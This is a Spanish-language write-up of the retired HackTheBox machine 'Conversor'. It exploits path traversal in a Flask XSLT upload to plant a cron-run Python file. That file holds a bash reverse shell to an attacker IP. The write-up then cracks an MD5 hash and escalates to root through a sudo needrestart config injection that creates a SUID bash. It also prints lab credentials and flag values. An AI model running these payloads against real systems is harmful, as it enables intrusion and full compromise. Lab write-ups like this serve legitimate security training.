---
title: "Conversor — HackTheBox Writeup"
machine: "Conversor"
platform: "HackTheBox"
os: "Linux"
difficulty: "Unknown"
tags: ["SQLi", "RCE", "Privesc", "Web"]
retired: true
summary: "Conversor es una máquina Linux de dificultad Media en HackTheBox que presenta una aplicación web Flask para transformar output de Nmap mediante archivos XML/XSL"
draft: false
---
## Índice

---

## Descripción General

Conversor es una máquina Linux de dificultad Media en HackTheBox que presenta una aplicación web Flask para transformar output de Nmap mediante archivos XML/XSLT. La cadena de ataque combina enumeración de código fuente expuesto públicamente, path traversal en la subida de archivos, abuso de un cron job y escalada de privilegios mediante inyección de configuración en `needrestart`.

**Tecnologías clave:** Flask, lxml, SQLite, Apache, needrestart, cron

---

## Reconocimiento

### Escaneo Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52 → redirige a conversor.htb
```

```bash
sudo nmap 10.129.32.189 -p- --open --min-rate 5000 -Pn -n -oG target
sudo nmap 10.129.32.189 -p 22,80 -sCV -Pn -oN targeted
echo "10.129.32.189 conversor.htb" | sudo tee -a /etc/hosts
```

---

## Análisis de la Aplicación Web

La aplicación en `http://conversor.htb/` permite subir un archivo **XML** junto a una hoja **XSLT** para transformar output de Nmap en un formato visual más atractivo. Requiere registro e inicio de sesión.

La página `/about` expone un botón para **descargar el código fuente completo** (`source_code.tar.gz`) — hallazgo crítico para la enumeración posterior.

**Usuarios identificados en `/about`:**

- `FisMatHack` — Backend Developer
- `Arturo Vidal` — Frontend & UX
- `David Ramos` — Team Lead

---

## Revisión del Código Fuente

```bash
wget http://conversor.htb/static/source_code.tar.gz
tar -xf source_code.tar.gz
find . -type f | sort
```

### Hallazgos críticos en `app.py`

| Componente | Vulnerabilidad |
| --- | --- |
| `app.secret_key` | Secret key hardcodeada: `Changemeplease` |
| `hashlib.md5` | Passwords en MD5 sin salt |
| `xml_file.filename` | Filename sin sanitizar → Path Traversal |
| `xslt_file.save()` | Archivo guardado en disco **antes** de ser parseado |
| `install.md` | Cron ejecuta `scripts/*.py` como `www-data` cada minuto |

### Cron job crítico (`install.md`)

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

Todo archivo `.py` depositado en `/var/www/conversor.htb/scripts/` se ejecuta cada minuto como `www-data`.

### Flujo vulnerable en `/convert` (app.py líneas 99-108)

```python
xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)   # Sin sanitizar
xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename) # Sin sanitizar
xml_file.save(xml_path)    # Guardado en disco
xslt_file.save(xslt_path)  # Guardado en disco ← archivo ya escrito
xslt_tree = etree.parse(xslt_path)  # Parseo posterior — falla pero ya es tarde
```

---

## Acceso Inicial — Path Traversal + Cron RCE

### 1. Registro y obtención de cookie de sesión

```bash
curl -s -X POST http://conversor.htb/login \
  -d "username=hackbro&password=pepe06" \
  -c /tmp/cookies.txt -L
```

### 2. Crear reverse shell Python

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.17.74/4444 0>&1'")
```

### 3. Subir payload con Path Traversal

El filename `../scripts/shell.py` deposita el archivo en `/var/www/conversor.htb/scripts/shell.py`. Aunque el parseo XSLT falla con `Start tag expected`, el archivo **ya fue guardado en disco** antes del error.

```bash
curl -s -X POST http://conversor.htb/convert \
  -b /tmp/cookies.txt \
  -F "xml_file=@test.xml" \
  -F "xslt_file=@shell.py;filename=../scripts/shell.py"
```

### 4. Listener + esperar cron

```bash
nc -lvnp 4444
```

En menos de 1 minuto el cron ejecuta `shell.py` y se obtiene shell como `www-data`.

```
www-data@conversor:/var/www/conversor.htb$
```

---

## Flag de Usuario — Crackeo de Hash MD5

Con acceso como `www-data` se puede leer la base de datos SQLite de la aplicación:

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|hackbro|3826cb604f33335065769b136ddd0261
```

Hash MD5 del usuario `fismathack` crackeado con John the Ripper:

```bash
echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

**Credenciales obtenidas:** `fismathack:Keepmesafeandwarm`

Acceso por SSH:

```bash
ssh fismathack@10.129.32.189
cat ~/user.txt
```

**user.txt:** `dc457c6eb94b251d10995c0bd44addc8`

---

## Escalada de Privilegios — needrestart Config Injection

### Enumeración

```bash
sudo -l
```

```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

`needrestart` versión 3.7 puede ejecutarse como root sin contraseña.

### Vector — Inyección de configuración con `c`

`needrestart` acepta un archivo de configuración personalizado mediante el flag `-c`. El archivo de configuración de needrestart permite ejecutar comandos Perl arbitrarios mediante la directiva `system()`.

```bash
echo 'system("cp /bin/bash /tmp/poc; chmod u+s /tmp/poc")' > /tmp/cmd.conf
sudo /usr/sbin/needrestart -c /tmp/cmd.conf
```

Esto copia `/bin/bash` a `/tmp/poc` con el bit SUID activado como root.

```bash
/tmp/poc -p
whoami
# root
cat /root/root.txt
```

**root.txt:** `6e5d8429181e7432256abad0df8e9ae1`

---

## Resumen de la Cadena de Ataque

![image.png](/img/conversor/1.png)

---

## Herramientas Utilizadas

- `nmap` — Escaneo de puertos
- `gobuster` — Fuzzing de directorios y vhosts
- `curl` — Interacción con la aplicación web
- `sqlite3` — Lectura de la base de datos
- `john` — Crackeo de hashes MD5
- `nc` — Listener para reverse shell
- `needrestart` — Vector de escalada de privilegios

---

*Writeup por  4pr3nd1z — Mayo 2026*
